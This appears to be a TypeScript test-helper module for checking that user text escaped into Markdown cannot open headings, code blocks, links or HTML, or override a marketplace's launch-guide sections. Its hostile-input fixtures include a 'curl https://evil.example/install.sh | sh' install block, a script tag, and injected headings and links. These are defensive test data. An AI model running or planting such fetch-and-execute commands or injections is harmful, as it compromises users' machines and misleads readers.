/**
 * Structure of a Markdown document, without a Markdown parser (the repo has none).
 *
 * blockStarts() lists every line that would START a block for a Markdown renderer.
 * links() lists every construct that would become a link or raw HTML. Two documents
 * with the same lists have the same headings, code blocks, quotes, lists and links;
 * the tests compare a document generated from hostile text with the one generated
 * from plain text.
 */

/** Lines that start a block: "kind: text". Escaped starters (a leading backslash) are not blocks. */
export function blockStarts(markdown: string): string[] {
  const out: string[] = [];
  const lines = markdown.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const prevBlank = i === 0 || lines[i - 1].trim() === "";
    if (/^( {4,}|\t)\S/.test(line) && prevBlank) { out.push(`indented-code: ${line.trim()}`); continue; }
    const body = line.replace(/^ {0,3}/, "");
    if (/^#{1,6}(\s|$)/.test(body)) out.push(`heading: ${body}`);
    else if (/^(`{3,}|~{3,})/.test(body)) out.push(`fence: ${body}`);
    else if (/^>/.test(body)) out.push(`quote: ${body}`);
    else if (/^(=+|-+)\s*$/.test(body) && !prevBlank) out.push(`setext-underline: ${body}`);
    else if (/^(-{3,}|\*{3,}|_{3,})\s*$/.test(body)) out.push(`rule: ${body}`);
    else if (/^([-+*]|\d{1,9}[.)])(\s|$)/.test(body)) out.push(`list: ${body}`);
    else if (/^<[A-Za-z/!?]/.test(body)) out.push(`html: ${body}`);
    else if (/^\[[^\]]*\]:/.test(body)) out.push(`link-definition: ${body}`);
    else if (/\|/.test(body) && /^\|?\s*:?-+:?\s*(\|\s*:?-+:?\s*)*\|?\s*$/.test(body)) out.push(`table-delimiter: ${body}`);
  }
  return out;
}

/** Only the kinds named, for comparisons that allow list items to differ. */
export function blockStartsOfKind(markdown: string, kinds: string[]): string[] {
  return blockStarts(markdown).filter((b) => kinds.includes(b.slice(0, b.indexOf(":"))));
}

/** Everything except list items. */
export const NON_LIST_KINDS = ["heading", "fence", "quote", "setext-underline", "rule", "indented-code", "html", "link-definition", "table-delimiter"];

/** Remove every backslash-escaped character, so what is left is only live syntax. */
function withoutEscapes(markdown: string): string {
  return markdown.replace(/\\[\s\S]/g, "");
}

/** Inline links and images, autolinks, raw HTML tags and link definitions that are live. */
export function links(markdown: string): string[] {
  const live = withoutEscapes(markdown);
  return [
    ...(live.match(/!?\[[^\]\n]*\]\([^)\n]*\)/g) ?? []),
    ...(live.match(/\[[^\]\n]*\]\[[^\]\n]*\]/g) ?? []),
    ...(live.match(/<[A-Za-z][A-Za-z0-9+.-]*:[^>\s]*>/g) ?? []),
    ...(live.match(/<\/?[A-Za-z!?][^>\n]*>/g) ?? []),
    ...(live.match(/^ {0,3}\[[^\]\n]*\]:.*$/gm) ?? []),
  ].sort();
}

/**
 * The marketplace's own rule for reading LAUNCHGUIDE.md, copied from
 * mcp-marketplace frontend/src/lib/launchguide.ts (parseLaunchGuide): a line that
 * matches /^##\s+(.+)/ starts a section, and a later section with the same name
 * REPLACES the earlier one. Returns section name -> content.
 */
export function marketplaceSections(markdown: string): Record<string, string> {
  const sections: Record<string, string> = {};
  let current = "";
  for (const line of markdown.split("\n")) {
    const header = line.match(/^##\s+(.+)/);
    if (header) {
      current = header[1].trim().toLowerCase();
      sections[current] = "";
    } else if (current) {
      sections[current] += line + "\n";
    }
  }
  return sections;
}

/** The marketplace's pattern for one setup requirement line (same source file). */
export const MARKETPLACE_SETUP_LINE = /^-\s+`([^`]+)`\s+\((\w+)\):\s*(.*)$/;
/** The marketplace's pattern for the first URL in a section (same source file). */
export const MARKETPLACE_URL = /(https?:\/\/[^\s)]+)/;

/** The text a Markdown renderer shows for an escaped single-line slot: escapes removed. */
export function rendered(escaped: string): string {
  return escaped.replace(/\\([\s\S])/g, "$1");
}

// ---------------------------------------------------------------- hostile inputs

/** The reported input: a description that used to become a rendered install section. */
export const HOSTILE_INSTALL = "\n## Install\n```bash\ncurl https://evil.example/install.sh | sh\n```";
/** Everything else that can open a block or a link, one per line. */
export const HOSTILE_EVERYTHING = [
  "Looks fine [click here](https://evil.example/a) and ![img](https://evil.example/p.png)",
  "<script>alert(1)</script> <a href=\"https://evil.example\">x</a> <https://evil.example/auto>",
  "# Top heading",
  "## Documentation URL",
  "https://evil.example/docs",
  "## Tagline",
  "Replaced tagline",
  "> quoted",
  "- item",
  "1. first",
  "~~~",
  "tilde fence",
  "~~~",
  "    indented code",
  "Setext heading",
  "===",
  "Another",
  "---",
  "[ref]: https://evil.example/ref",
  "see [text][ref]",
  "a | b",
  "--- | ---",
  "\\<b>already escaped\\</b> \\[x](y) and a trailing backslash \\",
].join("\n");
